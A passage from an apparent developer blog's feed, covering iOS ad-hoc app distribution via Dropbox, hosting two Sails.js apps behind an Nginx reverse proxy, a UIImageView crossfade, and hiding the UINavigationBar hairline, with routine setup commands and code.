class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">plist</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//Apple//DTD PLIST 1.0//EN&quot;</span> <span class="string">&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>items<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">key</span>&gt;</span>assets<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">key</span>&gt;</span>kind<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>software-package<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">key</span>&gt;</span>url<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>https://dl.dropboxusercontent.com/u/12345678/MyApp/MyApp.ipa<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">key</span>&gt;</span>metadata<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">key</span>&gt;</span>bundle-identifier<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>com.example.MyApp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">key</span>&gt;</span>bundle-version<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">key</span>&gt;</span>kind<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>software<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">key</span>&gt;</span>title<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>My App<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3rd-Move-both-ipa-amp-plist-files-to-your-Dropbox-Public-folder"><a href="#3rd-Move-both-ipa-amp-plist-files-to-your-Dropbox-Public-folder" class="headerlink" title="3rd: Move both ipa &amp; plist files to your Dropbox Public folder"></a>3rd: Move both <code>ipa</code> &amp; <code>plist</code> files to your Dropbox <code>Public</code> folder</h2><p>e.g.</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Dropbox</span><br><span class="line">  <span class="string">|---- MyApp</span></span><br><span class="line">          <span class="string">|------ MyApp.ipa</span></span><br><span class="line">          <span class="string">|------ MyApp.plist</span></span><br></pre></td></tr></table></figure><h2 id="4th-Get-the-public-link-from-Dropbox"><a href="#4th-Get-the-public-link-from-Dropbox" class="headerlink" title="4th: Get the public link from Dropbox"></a>4th: Get the public link from Dropbox</h2><p><img src="/images/posts/2014-03-31-distribute-ios-app-via-website/dropbox-public-link.png" alt="Copy Dropbox public link"></p><p>Then send the link over to your beta tester, then they will be able to install via Safari.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;The first time I seen this is &lt;a href=&quot;http://emu4ios.net/&quot;&gt;emu4ios.net&lt;/a&gt;. Then I found this is very useful and convenient for my beta</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Running multiple nodejs app in ONE server using Nginx</title>
    <link href="http://jslim.net/blog/2014/03/13/running-multiple-nodejs-app-in-one-server-using-nginx/"/>
    <id>http://jslim.net/blog/2014/03/13/running-multiple-nodejs-app-in-one-server-using-nginx/</id>
    <published>2014-03-13T15:47:19.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>This is running on Ubuntu 13.10</p><p>Here I would like to use <a href="http://sailsjs.org/">Sails.js framework</a> <em>(version 0.9.13)</em> to create node.js app.</p><h2 id="1-Install-node-js-on-Ubuntu"><a href="#1-Install-node-js-on-Ubuntu" class="headerlink" title="1. Install node.js on Ubuntu"></a>1. Install node.js on Ubuntu</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install python-software-properties python g++ make</span><br><span class="line">$ sudo<span class="built_in"> add-apt-repository </span>ppa:chris-lea/node.js</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install nodejs</span><br></pre></td></tr></table></figure><h2 id="2-Create-2-apps"><a href="#2-Create-2-apps" class="headerlink" title="2. Create 2 apps"></a>2. Create 2 apps</h2><p>Install Sails.js globally</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo npm -g <span class="keyword">install</span> sails</span><br></pre></td></tr></table></figure><p>Create projects</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> public_html &amp;&amp; <span class="built_in">cd</span> public_html</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sails new project1</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sails new project2</span></span><br></pre></td></tr></table></figure><p>Edit the home page for both projects <em>(to differentiate them)</em></p><p><strong>project1/views/home/index.ejs</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>This is project 1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>project2/views/home/index.ejs</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>This is second project<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-Change-the-environment-to-production"><a href="#3-Change-the-environment-to-production" class="headerlink" title="3. Change the environment to production"></a>3. Change the environment to production</h2><p><strong>project1/config/local.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">port</span>: <span class="number">8081</span>, <span class="comment">// change the port to 8081</span></span><br><span class="line">    <span class="attr">environment</span>: <span class="string">&#x27;production&#x27;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>project2/config/local.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">port</span>: <span class="number">8082</span>, <span class="comment">// change the port to 8082</span></span><br><span class="line">    <span class="attr">environment</span>: <span class="string">&#x27;production&#x27;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>In order to make the app run on background, we need <a href="https://github.com/nodejitsu/forever">forever</a></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo npm <span class="keyword">install</span> -g forever</span><br></pre></td></tr></table></figure><p>Now start the app using <strong>forever</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~<span class="regexp">/public_html/</span>project1</span><br><span class="line">$ forever start app.js</span><br><span class="line">warn:    --minUptime not set. Defaulting to: <span class="number">1000</span>ms</span><br><span class="line">warn:    --spinSleepTime not set. Your script will <span class="keyword">exit</span> <span class="keyword">if</span> it does not stay up <span class="keyword">for</span> at least <span class="number">1000</span>ms</span><br><span class="line">info:    Forever processing file: app.js</span><br></pre></td></tr></table></figure><p>Let’s open up your browser, and type <code>localhost:8081</code>… Oops… it doesn’t work like expected</p><p>Let’s check the log</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ forever logs</span><br><span class="line">info:    Logs <span class="keyword">for</span> running Forever processes</span><br><span class="line">data:        script logfile                    </span><br><span class="line">data:    [<span class="number">0</span>] app.js <span class="regexp">/home/u</span>sername<span class="regexp">/.forever/</span><span class="number">1</span>Vak.log</span><br></pre></td></tr></table></figure><p>See the content of the file</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ less ~<span class="regexp">/.forever/</span>1Vak.<span class="property">log</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">js</span>:<span class="number">340</span></span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">          ^</span><br><span class="line"><span class="title class_">Error</span>: <span class="title class_">Cannot</span> find <span class="variable language_">module</span> <span class="string">&#x27;sails&#x27;</span></span><br><span class="line">    at <span class="title class_">Function</span>.<span class="property">Module</span>.<span class="property">_resolveFilename</span> (<span class="variable language_">module</span>.<span class="property">js</span>:<span class="number">338</span>:<span class="number">15</span>)</span><br><span class="line">    at <span class="title class_">Function</span>.<span class="property">Module</span>.<span class="property">_load</span> (<span class="variable language_">module</span>.<span class="property">js</span>:<span class="number">280</span>:<span class="number">25</span>)</span><br><span class="line">    at <span class="title class_">Module</span>.<span class="property">require</span> (<span class="variable language_">module</span>.<span class="property">js</span>:<span class="number">364</span>:<span class="number">17</span>)</span><br><span class="line">    at <span class="built_in">require</span> (<span class="variable language_">module</span>.<span class="property">js</span>:<span class="number">380</span>:<span class="number">17</span>)</span><br><span class="line">    at <span class="title class_">Object</span>.&lt;anonymous&gt; (<span class="regexp">/home/</span>js/public_html/sails2/app.<span class="property">js</span>:<span class="number">2</span>:<span class="number">1</span>)</span><br><span class="line">    at <span class="title class_">Module</span>.<span class="property">_compile</span> (<span class="variable language_">module</span>.<span class="property">js</span>:<span class="number">456</span>:<span class="number">26</span>)</span><br><span class="line">    at <span class="title class_">Object</span>.<span class="property">Module</span>.<span class="property">_extensions</span>..<span class="property">js</span> (<span class="variable language_">module</span>.<span class="property">js</span>:<span class="number">474</span>:<span class="number">10</span>)</span><br><span class="line">    at <span class="title class_">Module</span>.<span class="property">load</span> (<span class="variable language_">module</span>.<span class="property">js</span>:<span class="number">356</span>:<span class="number">32</span>)</span><br><span class="line">    at <span class="title class_">Function</span>.<span class="property">Module</span>.<span class="property">_load</span> (<span class="variable language_">module</span>.<span class="property">js</span>:<span class="number">312</span>:<span class="number">12</span>)</span><br><span class="line">    at <span class="title class_">Function</span>.<span class="property">Module</span>.<span class="property">runMain</span> (<span class="variable language_">module</span>.<span class="property">js</span>:<span class="number">497</span>:<span class="number">10</span>)</span><br><span class="line"><span class="attr">error</span>: <span class="title class_">Forever</span> detected script exited <span class="keyword">with</span> <span class="attr">code</span>: <span class="number">8</span></span><br></pre></td></tr></table></figure><p>Now, the error tell us that we need to install <strong>Sails.js</strong> locally</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">forever stopall <span class="comment"># stop all process</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ~/public_html/project1</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo npm install sails <span class="comment"># without -g option</span></span></span><br></pre></td></tr></table></figure><p>Repeat the same thing on <strong>project2</strong></p><p>Now open up the browser, it should show up the content.</p><h2 id="4-Bind-different-domain-name-to-different-project"><a href="#4-Bind-different-domain-name-to-different-project" class="headerlink" title="4. Bind different domain name to different project"></a>4. Bind different domain name to different project</h2><p>First, we need <a href="http://nginx.org/">Nginx</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="built_in">get</span> install nginx</span><br></pre></td></tr></table></figure><p>Configure Nginx to listen to port 80 and forword the request to different app based by the port number</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> /etc/nginx/sites-available/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">touch</span> sails1.com.conf</span></span><br></pre></td></tr></table></figure><p>Put the content to <code>sails1.com.conf</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">  <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">  <span class="attribute">server_name</span> sails1.com;</span><br><span class="line"></span><br><span class="line">  <span class="section">location</span> / &#123;</span><br><span class="line">      <span class="attribute">proxy_pass</span> http://localhost:8081;</span><br><span class="line">      <span class="attribute">proxy_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line">      <span class="attribute">proxy_set_header</span> Upgrade <span class="variable">$http_upgrade</span>;</span><br><span class="line">      <span class="attribute">proxy_set_header</span> Connection <span class="string">&#x27;upgrade&#x27;</span>;</span><br><span class="line">      <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">      <span class="attribute">proxy_cache_bypass</span> <span class="variable">$http_upgrade</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This tell the server that forword the request from <a href="http://sails1.com/">sails1.com</a> to <a href="http://localhost:8081/">http://localhost:8081</a> <em>(which is the project1)</em></p><p>Just do the same thing for <strong>project2</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">  <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">  <span class="attribute">server_name</span> sails2.com;</span><br><span class="line"></span><br><span class="line">  <span class="section">location</span> / &#123;</span><br><span class="line">      <span class="attribute">proxy_pass</span> http://localhost:8082;</span><br><span class="line">      <span class="attribute">proxy_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line">      <span class="attribute">proxy_set_header</span> Upgrade <span class="variable">$http_upgrade</span>;</span><br><span class="line">      <span class="attribute">proxy_set_header</span> Connection <span class="string">&#x27;upgrade&#x27;</span>;</span><br><span class="line">      <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">      <span class="attribute">proxy_cache_bypass</span> <span class="variable">$http_upgrade</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enable the config. <em>(In order to make the config file take effect, symlink them to <strong>sites-enabled</strong> directory)</em></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ln -s <span class="regexp">/etc/</span>nginx<span class="regexp">/sites-available/</span>sails1.com.conf <span class="regexp">/etc/</span>nginx<span class="regexp">/sites-enabled/</span>sails1.com.conf</span><br><span class="line">$ sudo ln -s <span class="regexp">/etc/</span>nginx<span class="regexp">/sites-available/</span>sails2.com.conf <span class="regexp">/etc/</span>nginx<span class="regexp">/sites-enabled/</span>sails2.com.conf</span><br></pre></td></tr></table></figure><p>Restart Nginx server</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo service nginx restart</span><br></pre></td></tr></table></figure><p>Since I’m testing on local machine, so we need to edit the <strong>hosts</strong> file, append the content below the hosts file</p><p><strong>/etc/hosts</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nginx virtual host</span></span><br><span class="line">127.0.0.1    sails1.<span class="attribute">com</span></span><br><span class="line"><span class="number">127.0.0.1</span>    sails2.com</span><br></pre></td></tr></table></figure><h2 id="5-Done"><a href="#5-Done" class="headerlink" title="5. Done"></a>5. Done</h2><p>Basically what we do here is <a href="http://en.wikipedia.org/wiki/Reverse_proxy">Reverse proxy</a>, <strong>Nginx</strong> listen to the port 80 and passing the request to different app.</p><p><em>References:</em></p><ul><li><em><a href="http://blog.gorelative.com/getting-sailsjs-and-ghost-to-play-nice-on-digitalocean-through-nginx/">Getting sailsjs and ghost to play nice on DigitalOcean through nginx</a></em></li><li><em><a href="http://gerardmcgarry.com/2010/setting-up-a-virtual-host-in-nginx/">SETTING UP A VIRTUAL HOST IN NGINX</a></em></li><li><em><a href="https://groups.google.com/forum/#!topic/sailsjs/0F-9ueNGLVM">forever Error - Cannot find moudule ‘sails’</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Environment&quot;&gt;&lt;a href=&quot;#Environment&quot; class=&quot;headerlink&quot; title=&quot;Environment&quot;&gt;&lt;/a&gt;Environment&lt;/h1&gt;&lt;p&gt;This is running on Ubuntu</summary>
        
      
    
    
    
    
    <category term="nodejs" scheme="http://jslim.net/tags/nodejs/"/>
    
    <category term="sails.js" scheme="http://jslim.net/tags/sails-js/"/>
    
    <category term="nginx" scheme="http://jslim.net/tags/nginx/"/>
    
  </entry>
  
  <entry>
    <title>UIImageView animation fade in &amp;amp; out between images</title>
    <link href="http://jslim.net/blog/2014/03/11/uiimageview-animation-fade-in-and-out-between-images/"/>
    <id>http://jslim.net/blog/2014/03/11/uiimageview-animation-fade-in-and-out-between-images/</id>
    <published>2014-03-11T15:06:46.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>To animate between images <em>(not .gif)</em> in a UIImageView like the example below</p><p><strong>Original images</strong></p><p><img src="/images/posts/2014-03-12-uiimageview-animation-fade-in-and-out-between-images/Image1.png" alt="First image"></p><p><img src="/images/posts/2014-03-12-uiimageview-animation-fade-in-and-out-between-images/Image2.png" alt="Second image"></p><p><strong>Result</strong></p><p><img src="/images/posts/2014-03-12-uiimageview-animation-fade-in-and-out-between-images/animation.gif" alt="Animate between 2 images"></p><p>The existing method in <code>UIImageView</code> simply won’t work.</p><p>To get the result like this</p><p><strong>MyViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="type">void</span>)viewDidLoad</span><br><span class="line">&#123;</span><br><span class="line">    [<span class="variable language_">super</span> viewDidLoad];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// make the first call</span></span><br><span class="line">    [<span class="keyword">self</span> animateImages];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)animateImages</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">NSArray</span> *animationImages = @[[<span class="built_in">UIImage</span> imageNamed:<span class="string">@&quot;Image1&quot;</span>], [<span class="built_in">UIImage</span> imageNamed:<span class="string">@&quot;Image2&quot;</span>]];</span><br><span class="line">    <span class="built_in">UIImage</span> *image = [animationImages objectAtIndex:(count % [animationImages count])];</span><br><span class="line">    </span><br><span class="line">    [<span class="built_in">UIView</span> transitionWithView:<span class="keyword">self</span>.animationImageView</span><br><span class="line">                      duration:<span class="number">1.0</span>f <span class="comment">// animation duration</span></span><br><span class="line">                       options:<span class="built_in">UIViewAnimationOptionTransitionCrossDissolve</span></span><br><span class="line">                    animations:^&#123;</span><br><span class="line">                        <span class="keyword">self</span>.animationImageView.image = image; <span class="comment">// change to other image</span></span><br><span class="line">                    &#125; completion:^(<span class="type">BOOL</span> finished) &#123;</span><br><span class="line">                        [<span class="keyword">self</span> animateImages]; <span class="comment">// once finished, repeat again</span></span><br><span class="line">                        count++; <span class="comment">// this is to keep the reference of which image should be loaded next</span></span><br><span class="line">                    &#125;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Reference: <a href="http://stackoverflow.com/questions/2834573/how-to-animate-the-change-of-image-in-an-uiimageview/12778881#12778881">How to animate the change of image in an UIImageView?</a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;To animate between images &lt;em&gt;(not .gif)&lt;/em&gt; in a UIImageView like the example below&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Original</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Remove the 1px shadow from UINavigationBar</title>
    <link href="http://jslim.net/blog/2014/02/28/remove-the-1px-shadow-from-uinavigationbar/"/>
    <id>http://jslim.net/blog/2014/02/28/remove-the-1px-shadow-from-uinavigationbar/</id>
    <published>2014-02-28T05:25:15.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>There is a shadow <em>(only 1 pixel)</em> below the UINavigationBar</p><p><img src="/images/posts/2014-02-28-remove-the-1px-shadow-from-uinavigationbar/with-shadow.png" alt="With shadow"></p><p>May be you can’t see clearly, zoom it see</p><p><img src="/images/posts/2014-02-28-remove-the-1px-shadow-from-uinavigationbar/shadow-zoom.png" alt="Shadow zoom"></p><p>We can see 1 pixel darkness. Where the gray area is what I want, the code is</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">self</span>.navigationController.navigationBar.layer.shadowRadius = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">self</span>.navigationController.navigationBar.layer.shadowOffset = <span class="built_in">CGSizeMake</span>(<span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">self</span>.navigationController.navigationBar.layer.shadowOpacity = <span class="number">0.5</span>;</span><br><span class="line"><span class="keyword">self</span>.navigationController.navigationBar.layer.shadowColor = [<span class="built_in">UIColor</span> grayColor].CGColor;</span><br><span class="line"><span class="built_in">UIBezierPath</span> *path = [<span class="built_in">UIBezierPath</span> bezierPathWithRect:<span class="keyword">self</span>.navigationController.navigationBar.bounds];</span><br><span class="line"><span class="keyword">self</span>.navigationController.navigationBar.layer.shadowPath = path.CGPath;</span><br></pre></td></tr></table></figure><p><strong>NOTE: The code above is to draw the gray shadow only</strong></p><p>The desired result will be</p><p><img src="/images/posts/2014-02-28-remove-the-1px-shadow-from-uinavigationbar/without-shadow.png" alt="Without shadow"></p><p>After zoom</p><p><img src="/images/posts/2014-02-28-remove-the-1px-shadow-from-uinavigationbar/no-shadow-zoom.png" alt="After zoom: Without shadow"></p><p>In order to achieve the result</p><p><strong>MyRootViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">ViewController</span> </span>&#123;</span><br><span class="line">    <span class="built_in">UIImageView</span> *navBarHairlineImageView;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)viewDidLoad</span><br><span class="line">&#123;</span><br><span class="line">    [<span class="variable language_">super</span> viewDidLoad];</span><br><span class="line">    navBarHairlineImageView = [<span class="keyword">self</span> findHairlineImageViewUnder:<span class="keyword">self</span>.navigationController.navigationBar];</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)viewWillAppear:(<span class="type">BOOL</span>)animated</span><br><span class="line">&#123;</span><br><span class="line">    [<span class="variable language_">super</span> viewWillAppear:animated];</span><br><span class="line">    navBarHairlineImageView.hidden = <span class="literal">YES</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="built_in">UIImageView</span> *)findHairlineImageViewUnder:(<span class="built_in">UIView</span> *)view &#123;</span><br><span class="line">    <span class="keyword">if</span> ([view isKindOfClass:<span class="built_in">UIImageView</span>.class] &amp;&amp; view.bounds.size.height &lt;= <span class="number">1.0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">UIImageView</span> *)view;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">UIView</span> *subview <span class="keyword">in</span> view.subviews) &#123;</span><br><span class="line">        <span class="built_in">UIImageView</span> *imageView = [<span class="keyword">self</span> findHairlineImageViewUnder:subview];</span><br><span class="line">        <span class="keyword">if</span> (imageView) &#123;</span><br><span class="line">            <span class="keyword">return</span> imageView;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span 